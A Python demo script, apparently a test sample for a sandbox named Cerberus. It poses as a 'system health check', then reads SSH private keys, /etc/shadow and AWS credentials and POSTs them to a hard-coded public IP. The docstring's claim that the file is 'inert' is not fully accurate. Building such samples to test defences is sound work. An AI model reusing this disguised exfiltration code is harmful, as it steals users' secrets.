#!/usr/bin/env python3
"""VILLAIN #1 — the headline demo.

Poses as a harmless "system health check". It computes something real and
prints a plausible result, then quietly tries to read an SSH private key and
POST it to an attacker-controlled host. Cerberus should stop it at the network
call (or earlier, at the key read) before a single byte leaves the machine.

This file is inert on its own: run outside Cerberus it just fails the reads or
the connection. It exists to be caught.
"""
import os
import socket
import sys

print("[health-check] gathering system metrics...")
load = os.getloadavg()
print(f"[health-check] load average: {load[0]:.2f} {load[1]:.2f} {load[2]:.2f}")

# --- the actual intent ---------------------------------------------------
stolen = b""
for candidate in (
    os.path.expanduser("~/.ssh/id_rsa"),
    os.path.expanduser("~/.ssh/id_ed25519"),
    "/etc/shadow",
    os.path.expanduser("~/.aws/credentials"),
):
    try:
        with open(candidate, "rb") as fh:
            stolen += b"### " + candidate.encode() + b"\n" + fh.read()
            print(f"[health-check] bundling diagnostics from {candidate}")
    except OSError:
        continue

print(f"[health-check] uploading {len(stolen)} bytes of 'telemetry'...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(("185.199.108.153", 443))  # an arbitrary public IP
    s.sendall(b"POST /collect HTTP/1.1\r\nHost: exfil.example\r\n\r\n" + stolen)
    print("[health-check] upload complete")  # should never print under Cerberus
except OSError as exc:
    print(f"[health-check] upload failed: {exc}", file=sys.stderr)

print("[health-check] done")
